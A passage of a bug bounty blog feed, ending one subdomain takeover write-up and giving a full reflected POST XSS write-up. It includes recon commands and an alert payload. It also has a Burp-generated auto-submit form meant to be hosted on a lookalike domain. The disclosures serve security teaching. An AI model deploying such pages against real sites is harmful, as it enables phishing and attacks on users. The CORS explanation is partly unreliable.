    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-13-subdomain-takeover-via-unclaimed-azure-vm/website.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;And lastly, and most importantly… don’t forget to shut down and decommission the virtual machine and all Azure assets you may have created in the process! Azure charges by the hour, and if you’re not careful, they will take away your bounty :satisfied:.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;YEAH! The first subdomain takeover always feels like…&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/magic.gif&quot; /&gt;&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-this-vulnerability-exist&quot;&gt;3.2. Why does this vulnerability exist?&lt;/h2&gt;

&lt;p&gt;As you can see, this is not the typical vulnerability due to a flaw in the code. It seems more like a vulnerability related to the human factor and the management of the company’s assets. Some of the reasons that could lead to the presence of this vulnerability are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Unused or forgotten services&lt;/strong&gt;: companies often use various third-party services or cloud platforms for different purposes. Over time, they might stop using a particular service or platform, but the corresponding subdomains are still configured in their DNS records.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Incomplete cleanup&lt;/strong&gt;: when organizations migrate services or shut down projects, there might be oversight in cleaning up DNS records. Subdomains pointing to services that are no longer in use may be left behind.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Third-Party integrations&lt;/strong&gt;: companies frequently integrate third-party services or applications into their infrastructure. If these integrations involve creating subdomains, neglecting to update or remove DNS records after discontinuing the service can lead to subdomain takeover vulnerabilities.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;External contractors and developers&lt;/strong&gt;: companies often work with external contractors or developers for specific projects. If these external parties set up subdomains for their use, and the company doesn’t manage DNS records properly, subdomain takeover vulnerabilities may arise if the external parties’ services are terminated.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Lack of inventory and monitoring&lt;/strong&gt;: some organizations may not maintain a comprehensive inventory of their subdomains or lack proper monitoring mechanisms. This can result in not promptly identifying and addressing subdomains that are no longer in use.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dynamic cloud infrastructure&lt;/strong&gt;: in cloud environments, organizations may dynamically create and destroy resources. If a subdomain is associated with a cloud resource (e.g., an Amazon S3 bucket) that gets deleted, but the DNS record remains, it can lead to subdomain takeover.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Employee turnover&lt;/strong&gt;: when employees who manage DNS records leave the organization, and there is no proper knowledge transfer or documentation, it can lead to lapses in managing subdomains effectively.&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;The subdomain was the typical forgotten asset that the company did not even remember, so the criticality of the asset was low. Getting this criticality in an asset when reporting this type of vulnerability is quite common. As we saw in the previous section, if this vulnerability exists in an asset, it is possibly because it is not monitored, and this would be because it is not an important asset for them.&lt;/p&gt;

&lt;p&gt;On the other hand, this vulnerability is commonly classified as high or critical because as you have seen, it is possible to gain full control of the content that will display the subdomain. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: Low&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: High&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $200 for each subdomain takeover (because of a 2X reward multiplier on high and critical vulnerabilities)&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;VPS are a very useful tool for bug bounty. In this case with the report of these subdomain takeovers I already amortized the cost of the VPS for the next 2 years and I had to to practically nothing.&lt;/li&gt;
  &lt;li&gt;When you find a vulnerability in a subdomain, try to look for the same vulnerability in other subdomains with a similar name. As we saw in this post, I found 2 subdomain takeovers in domains with very similar names, possibly because one belonged to the production environment and the other to a pre-production or QA environment.&lt;/li&gt;
  &lt;li&gt;There are some vulnerabilities whose exploitation can be very hard and whose impact is not always very high, as we saw in the post about &lt;a href=&quot;https://blog.hackcommander.com/posts/2023/05/03/te-te-http-request-smuggling-obfuscating-te-header/&quot;&gt;HTTP request smuggling&lt;/a&gt;. However, there are also the opposite cases, like this one, in which we have a vulnerability that is very easy to detect and exploit and yet its impact is high. Many bug bounty hunters have fully automated detection, exploitation and reporting of vulnerabilities such as this one.&lt;/li&gt;
  &lt;li&gt;Try to help content creators you like. For example, the creator of reconFTW, &lt;a href=&quot;https://es.linkedin.com/in/alexisfdezfdez/es&quot;&gt;Alexis&lt;/a&gt;, has a &lt;a href=&quot;https://www.buymeacoffee.com/six2dez&quot;&gt;Buy Me a Coffee&lt;/a&gt; account where he can make donations. Making a donation of 1 coffee costs nothing and is a sign of recognition and admiration that encourages content creators to continue creating quality content.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="vps" /><category term="osint" /><category term="reconftw" /><category term="nuclei" /><category term="subdomain takeover" /><summary type="html">Partial disclosure of a bug bounty report: subdomain takeover via unclaimed Azure VM.</summary></entry><entry><title type="html">Reflected XSS through POST request in a login form</title><link href="https://hackcommander.github.io/posts/2023/11/05/reflected-xss-through-post-request-in-login-form/" rel="alternate" type="text/html" title="Reflected XSS through POST request in a login form" /><published>2023-11-05T00:00:00+01:00</published><updated>2023-11-05T00:00:00+01:00</updated><id>https://hackcommander.github.io/posts/2023/11/05/reflected-xss-through-post-request-in-login-form</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/11/05/reflected-xss-through-post-request-in-login-form/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to show one of the first XSS I reported in a bug bounty program: reflected XSS through POST request in a login form. It’s not a big deal but this post might be useful for all those who have ever found a POST XSS and thought it was not reportable because it had no impact.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path &lt;em&gt;/home/user/.config/amass/config.ini&lt;/em&gt;, you can use the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;amass enum -brute -d example.com &apos;/home/user/.config/amass/config.ini&apos; | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;Amass&lt;/a&gt; is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;Httpx&lt;/a&gt; is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies… that I have specified in the parameters to be displayed.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;The discovery of this vulnerability was fairly straightforward. I tried to login with the user &lt;em&gt;bugbounty&lt;/em&gt;, just to test the form, and I got the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/reflected-username.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is suspicious because it is usual to find messages of the type &lt;em&gt;Incorrect credentials&lt;/em&gt;, where the reason for the failure is not detailed and the username is not reflected. Taking into account that the username is reflected, I sent the following payload as username&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and I got the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So… we have a POST XSS!&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;p&gt;Unfortunately I do not keep the Burpsuite project as this was one of my first reports, but it is also not necessary to explain the idea behind this exploitation, that as usual in this blog, we have to thank the guys from PortSwigger&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://portswigger.net/blog/exploiting-xss-in-post-requests&quot;&gt;Exploiting XSS in POST requests (PortSwigger)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I do not have the original request, but we can assume that it was a request very similar to this one&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=user123&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;password=securepassword123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and these are the steps I followed:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;I sent the request to the Burp repeater&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/burp-repeater.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;I right clicked on the request and selected &lt;em&gt;Engagement tools -&amp;gt; Generate CSRF PoC&lt;/em&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/repeater-csrf-poc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Don’t get confused, this vulnerability is not a CSRF. They simply coincide in the first step, which involves generating an HTML/JavaScript code that sends a specific request to a domain. In this case, what I wanted to achieve is to obtain an HTML/JavaScript code that can be hosted on a malicious website, and when a user accesses it, it automatically sends the request with the XSS to the vulnerable domain. This Burp option was designed to exploit CSRFs but can also be used for PoCs like the one I am showing in this post, and in general for any vulnerability that involves generating HTML/JavaScript code that sends a request.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;I selected &lt;em&gt;Options -&amp;gt; Include auto-submit script&lt;/em&gt; and then &lt;em&gt;Regenerate -&amp;gt; Test in browser&lt;/em&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/csrf-poc-generator.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;So in this example the malicious HTML/JavaScript code is&lt;/p&gt;

    &lt;div class=&quot;code-header&quot;&gt;
   &lt;button class=&quot;copy-code-button&quot;&gt;
     Copy
   &lt;/button&gt;
 &lt;/div&gt;
    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://example.com/login&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;lt;script&amp;amp;gt;alert&amp;amp;#40;1&amp;amp;#41;&amp;amp;lt;&amp;amp;#47;script&amp;amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;securepassword123&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit request&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;history&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pushState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;This code can be stored in a fake domain like &lt;em&gt;example-support.com&lt;/em&gt;, with a credible name from a social engineering point of view. The JavaScript code generated by the &lt;em&gt;Include auto-submit script&lt;/em&gt; option is necessary so that the POST request with the XSS is sent automatically when the user visits the page and does not need to click on the submit button.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;I Copied the URL&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/csrf-poc-generator-url.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;and pasted in the browser. After that, I checked that the alert was executed in the context of the vulnerable web site&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;This means that any user visiting the fake domain &lt;em&gt;example-support.com&lt;/em&gt;, where the malicious HTML/JavaScript code would be stored, will automatically send the malicious request to the vulnerable domain and suffer an XSS in the context of that domain.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work?&lt;/h2&gt;

&lt;p&gt;But you’re probably thinking now…&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/sorcery.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Is this always possible? The short answer is &lt;strong&gt;no&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;In this case this technique worked but I can say that I found other POST XSS in which this technique did not work. Unfortunately I do not keep the screenshots of the errors obtained because at that time I did not ask too many questions when something did not work :sweat_smile:.&lt;/p&gt;

&lt;p&gt;On a Linux system, if you store the HTML/JavaScript code from the previous section in the file &lt;em&gt;/var/www/html/index.html&lt;/em&gt; and run the command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;sudo apache2 system start
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;you will have a web server up on port 80 on your machine. At this point, if you set Burpsuite to intercept traffic and access the URL &lt;em&gt;http://localhost/&lt;/em&gt; you will see that the first request that is sent is obviously&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/get-to-localhost.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and if you click on &lt;em&gt;Forward&lt;/em&gt; to give way to the next request you will see that the next request is&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-11-05-reflected-xss-through-post-request-in-login-form/post-from-localhost.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see there are 2 headers, the &lt;em&gt;Origin&lt;/em&gt; and &lt;em&gt;Referer&lt;/em&gt; headers, where the domain localhost appears (the fake domain in a real attack), and the &lt;em&gt;Host&lt;/em&gt; header where the domain &lt;em&gt;example.com&lt;/em&gt; appears (the vulnerable domain in a real attack). This is what is called a &lt;strong&gt;cross-domain&lt;/strong&gt; request since the request comes from one domain but goes to a different one.&lt;/p&gt;

&lt;p&gt;And now it is time to talk about these concepts:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Same-origin policy (SOP)&lt;/strong&gt;: the Same-Origin Policy (SOP) is a web security mechanism implemented by web browsers that restricts scripts on one origin from accessing data from another origin. It helps prevent unauthorized data access and actions by scripts from other origins. For example, if you have a web page hosted at &lt;em&gt;https://www.example.com/&lt;/em&gt;, the SOP prevents JavaScript on that page from accessing data from a different domain like &lt;em&gt;https://malicious.com/&lt;/em&gt;. In the same way, it would prevent JavaScript in &lt;em&gt;https://malicious.com/&lt;/em&gt; from accessing data from a different domain such as &lt;em&gt;https://www.example.com/&lt;/em&gt;, thus avoiding attacks like the one shown in this post. You can learn more about SOP at the following link&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/cors/same-origin-policy&quot;&gt;Same-origin policy (SOP) (PortSwigger)&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Cross-Origin Resource Sharing (CORS)&lt;/strong&gt;: the Cross-Origin Resource Sharing (CORS) is a security feature that allows web servers to specify which domains are allowed to access their resources via HTTP requests, relaxing the same-origin policy when necessary. For instance, a website can send CORS headers to indicate that &lt;em&gt;https://trusted-origin.com/&lt;/em&gt; is allowed to access data of the website. Without CORS, such accesses would be blocked by the browser, but with CORS, specific cross-origin accesses can be selectively allowed, enhancing the functionality of web applications while maintaining security. You can learn more about CORS at the following link&lt;/p&gt;

    &lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/cors&quot;&gt;Cross-origin resource sharing (CORS) (PortSwigger)&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;SOP came first as a client-side security measure&lt;/strong&gt; to prevent cross-origin accesses. &lt;strong&gt;CORS was later introduced as a server side implementation&lt;/strong&gt; to enable controlled cross-origin accesses, specifying which domains are allowed access to resources, addressing SOP’s limitations. So we can consider that CORS is for the SOP a kind of…&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/relax-bro.gif&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In principle, SOP prevents the browser from any kind of cross-domain accesses and this is not something that the developer can modify directly because SOP is implemented in the user’s browser, it is a client-side security measure. However, through an overly flexible CORS policy it is possible to allow some domains, even all domains, to make cross-domain accesses to my domain. And this is something that the developer can modify because it is a server-side configuration.&lt;/p&gt;

&lt;p&gt;So even though I don’t keep the burp project and the vulnerable asset was decommissioned, it is possible to ensure that the asset had a CORS policy that was too lax. The most lax CORS policy possible would be to allow access to web resources from any source, which we could identify by the presence of the following header&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;in an HTTP response from the vulnerable server. This could have allowed the cross-domain request and subsequent access to the response, exploiting the POST XSS to be sent from any other domain without problems.&lt;/p&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;The subdomain was the typical forgotten asset that the company did not even remember it had, so the criticality of the asset was low. Also an XSS usually is considered a medium severity vulnerability and because I wasn’t able to sign up and log in the website, I couldn’t demonstrate a high impact such as session hijacking. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: Low&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: Medium&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $50&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;No credentials does not mean game over. In a login form you can look for authentication vulnerabilities, SQL injection… or XSS, as in this case. This is the second post I publish about a vulnerability in a login form and both vulnerabilities were found without credentials.&lt;/li&gt;
  &lt;li&gt;Don’t give up if you find a vulnerability that is apparently not weaponizable and therefore has no impact. You may be able to chain it with another vulnerability or find an original attack vector to make an impact.&lt;/li&gt;
  &lt;li&gt;Try to find out why the techniques you are applying are not working, check the errors obtained and deepen the concepts. Sometimes bug bounty is like a rat race where you don’t allow yourself to go deep into the vulnerabilities you find to go for the next bug, but sometimes it’s good to stop and think about why the payload is not working. Don’t forget that although the main goal in bug bounty is supposed to be money, it should be learning, because the only way to get important bugs is to reach levels of knowledge that others haven’t reached.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="burpsuite" /><category term="portswigger" /><category term="xss" /><category term="sop" /><category term="cors" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS through POST request in a login form.</summary></entry><entry><title type="html">Reflected XSS in search filter clear button in an e-commerce website</title><link href="https://hackcommander.github.io/posts/2023/06/24/reflected-xss-in-search-filter-clear-button/" rel="alternate" type="text/html" title="Reflected XSS in search filter clear button in an e-commerce website" /><published>2023-06-24T00:00:00+02:00</published><updated>2023-06-24T00:00:00+02:00</updated><id>https://hackcommander.github.io/posts/2023/06/24/reflected-xss-in-search-filter-clear-button</id><content type="html" xml:base="https://hackcommander.github.io/posts/2023/06/24/reflected-xss-in-search-filter-clear-button/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-2&quot;&gt;2. Vulnerability discovery&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-3&quot;&gt;3. Vulnerability exploitation&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-1&quot;&gt;3.1. Steps of exploitation&lt;/a&gt;
        &lt;ul&gt;
